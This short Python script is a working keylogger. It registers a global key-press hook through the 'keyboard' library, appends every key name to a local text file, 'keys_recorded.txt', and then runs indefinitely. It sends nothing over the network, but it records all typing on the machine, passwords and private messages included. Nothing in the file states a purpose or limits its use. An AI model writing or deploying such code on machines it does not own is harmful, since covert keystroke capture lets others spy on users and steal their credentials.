import keyboard

logFile = "keys_recorded.txt"

def onKeyPress(event):
    with open(logFile , 'a') as f:
        f.write("\n{}".format(event.name))

keyboard.on_press(onKeyPress)

keyboard.wait()